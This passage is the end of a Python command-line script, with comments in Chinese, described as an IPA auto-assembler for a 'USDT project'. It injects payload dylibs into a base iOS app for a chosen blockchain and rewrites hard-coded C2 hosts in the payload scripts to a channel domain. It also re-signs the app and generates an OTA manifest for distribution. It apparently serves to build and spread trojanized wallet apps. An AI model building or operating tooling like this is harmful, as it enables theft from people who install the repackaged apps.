            warn(f"签名失败：{e}")
            return 1

    # --- 结果登记 ---
    if args.result_json:
        with open(args.result_json, "w", encoding="utf-8") as f:
            json.dump(result, f, ensure_ascii=False, indent=2)
        log(f"结果登记：{args.result_json}")

    return result


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def main():
    ap = argparse.ArgumentParser(description="IPA 自动组装器（USDT项目 · 线 1）")
    ap.add_argument("--base-ipa", "--base", dest="base", help="基座 IPA 路径")
    ap.add_argument("--chain", choices=list(CHAIN_PAYLOADS), help="目标链")
    ap.add_argument("--version-tag", default=None,
                    help="版本键（如 '18,6,2'），用于选版本增补载荷")
    ap.add_argument("--payload-dir", default="04-landing/ios-templates/payloads",
                    help="载荷 dylib 目录")
    ap.add_argument("--out", default="dist/ipa", help="产物目录")
    ap.add_argument("--base-url", default=None,
                    help="OTA 分发基址（给了才生成 manifest.plist）")
    ap.add_argument("--icon57", action="store_true",
                    help="在 manifest 中加入 display-image（icon57.png）")
    ap.add_argument("--icon512", action="store_true",
                    help="在 manifest 中加入 full-size-image（icon512.png）")
    ap.add_argument("--result-json", default=None, help="把结果写入 JSON")
    ap.add_argument("--dry-run", action="store_true", help="只演示，不落盘")
    # ★ 与既有机制联动的两个入口
    ap.add_argument("--render-template", default=None, metavar="TPL",
                    help="先渲染一个 .template.js（占位符→环境变量真值），再组装")
    ap.add_argument("--rewrite-host", default=None, metavar="BASE",
                    help="把载荷内硬编码 C2 改写为该渠道域名（如 https://ch.example）")
    ap.add_argument("--render-out", default=None,
                    help="渲染/重写产物目录（默认 <out>/_render）")
    # ★ D-1 裁决口径统一（与苹果线 ipa_pipeline.py 的 exit 10 一致）：
    #   签名段可插拔；工具缺失即【显式失败】，绝不静默产出"看起来已签名"的产物。
    ap.add_argument("--sign", default=None, metavar="P12",
                    help="签名（可选）。工具由 IPA_SIGN_TOOL 指定（默认 zsign）；缺失即显式失败")
    args = ap.parse_args()

    # --- ★ 预处理：模板渲染 / URL 重写（复用既有机制） ---
    pre = {"rendered": None, "rewritten": None}
    if args.render_template or args.rewrite_host:
        render_dir = args.render_out or os.path.join(args.out, "_render")
        os.makedirs(render_dir, exist_ok=True)
        try:
            if args.render_template:
                p, n, _ = render_template(args.render_template, render_dir)
                pre["rendered"] = {"path": p, "replaced": n}
            if args.rewrite_host:
                # 对载荷目录内所有【文本类 .js】套用重写规则；
                # ★ 二进制 dylib 不做文本重写，但**必须一并复制**到重写目录
                #   （否则后续组装在重写目录里找不到 dylib —— 实测踩出的 bug）。
                pdir = os.path.abspath(args.payload_dir)
                out_rw = os.path.join(render_dir, "rewritten")
                os.makedirs(out_rw, exist_ok=True)
                total = {}
                copied = 0
                for fn in os.listdir(pdir):
                    sp = os.path.join(pdir, fn)
                    if not os.path.isfile(sp):
                        continue
                    if fn.endswith(".js"):
                        _p, hits = rewrite_payload_urls(sp, args.rewrite_host, out_rw)
                        total.update(hits)
                    else:
                        shutil.copy2(sp, os.path.join(out_rw, fn))
                        copied += 1
                log(f"URL 重写：{len(total)} 条规则命中；原样复制 {copied} 个非 JS 载荷")
                pre["rewritten"] = {"dir": out_rw, "hits": total, "copied": copied}
                # 让后续组装从重写后的目录取载荷
                args.payload_dir = out_rw
        except Exception as e:  # noqa: BLE001
            warn(f"预处理失败：{e}")
            return 1

    if not args.base or not args.chain:
        ap.error("--base 与 --chain 为必填（除 --manifest-only 外）")

    try:
        res = assemble(args)
    except Exception as e:  # noqa: BLE001
        warn(f"组装失败：{e}")
        return 2

    # 把预处理结果并入最终 JSON（若启用）
    if pre.get("rendered") or pre.get("rewritten"):
        res["preprocess"] = pre
        if args.result_json:
            try:
                with open(args.result_json, "w", encoding="utf-8") as f:
                    json.dump(res, f, ensure_ascii=False, indent=2)
            except Exception:  # noqa: BLE001
                pass

    print(json.dumps(res, ensure_ascii=False, indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(main())
